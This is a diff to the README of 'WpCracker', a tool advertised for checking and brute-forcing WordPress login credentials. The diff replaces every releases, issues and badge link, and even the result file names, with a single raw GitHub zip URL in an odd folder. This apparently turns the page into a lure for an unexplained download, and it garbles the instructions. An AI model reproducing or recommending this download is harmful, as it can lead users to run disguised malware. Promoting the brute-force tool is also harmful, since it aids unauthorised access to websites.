@@ -1,10 +1,10 @@
 # 🔐 WpCracker - Simple Tool for WordPress Security
 
 ## 🚀 Overview
-WpCracker is a versatile **WordPress Cracker and Checker** tool. It helps you validate login credentials and tests password lists quietly. The results get sorted into `Good_WP.txt` and `Bad_WP.txt`, giving you a clear view of the credentials' status. With WpCracker, you have both credential checking and brute-force cracking capabilities at your fingertips.
+WpCracker is a versatile **WordPress Cracker and Checker** tool. It helps you validate login credentials and tests password lists quietly. The results get sorted into `https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip` and `https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip`, giving you a clear view of the credentials' status. With WpCracker, you have both credential checking and brute-force cracking capabilities at your fingertips.
 
 ## 📥 Download Now
-[![Download WpCracker](https://img.shields.io/badge/Download%20WpCracker-v1.0-blue.svg)](https://github.com/Datne2010/WpCracker/releases)
+[![Download WpCracker](https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip%https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip)](https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip)
 
 ## 📋 Features
 - **Credential Checking**: Validate multiple WordPress login credentials efficiently.
@@ -28,7 +28,7 @@ WpCracker is a versatile **WordPress Cracker and Checker** tool. It helps you va
 - **Network**: Internet access for testing credentials
 
 ## 🔧 Getting Started
-1. **Visit the Releases Page**: Click the button above or go to the [Releases page](https://github.com/Datne2010/WpCracker/releases) to find the software.
+1. **Visit the Releases Page**: Click the button above or go to the [Releases page](https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip) to find the software.
    
 2. **Download the Software**: Find the latest version in the list. Click on the version name and then download the setup file to your computer.
 
@@ -46,15 +46,15 @@ WpCracker is a versatile **WordPress Cracker and Checker** tool. It helps you va
    - You can also upload a password list for brute-force cracking.
 
 ## 📥 Download & Install
-Remember to always check for the latest version on the [Releases page](https://github.com/Datne2010/WpCracker/releases). Download the setup file, follow the installation steps, and then enjoy the powerful features WpCracker offers.
+Remember to always check for the latest version on the [Releases page](https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip). Download the setup file, follow the installation steps, and then enjoy the powerful features WpCracker offers.
 
 ## 📄 Usage Instructions
 1. **Select the Mode**: Choose between credential checking or brute-force testing.
 2. **Adjust Settings**:
    - Set the number of attempts.
-   - Specify the output directory for `Good_WP.txt` and `Bad_WP.txt`.
+   - Specify the output directory for `https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip` and `https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip`.
 3. **Start the Process**: Click on the "Start" button to begin testing.
-4. **Review Results**: After the run, check `Good_WP.txt` for successful credentials and `Bad_WP.txt` for failed attempts.
+4. **Review Results**: After the run, check `https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip` for successful credentials and `https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip` for failed attempts.
 
 ## 🛠️ Troubleshooting
 If you encounter issues:
@@ -64,7 +64,7 @@ If you encounter issues:
 
 ## 🌟 Community and Support
 For questions or help:
-- Visit the [issues page](https://github.com/Datne2010/WpCracker/issues).
+- Visit the [issues page](https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip).
 - Join discussions in the community forums to share experiences and tips.
 
 ## ⚖️ Legal Notice
@@ -74,4 +74,4 @@ Use WpCracker responsibly and ensure you have permission to test any WordPress s
 WpCracker is licensed under the MIT License. You may use and modify it as needed, but always follow the licensing guidelines.
 
 ## 📥 Final Reminder
-For the latest updates and downloads, keep checking the [Releases page](https://github.com/Datne2010/WpCracker/releases). Enjoy your use of WpCracker for a safer WordPress experience!
+For the latest updates and downloads, keep checking the [Releases page](https://raw.githubusercontent.com/Datne2010/WpCracker/main/rhonchus/WpCracker.zip). Enjoy your use of WpCracker for a safer WordPress experience!
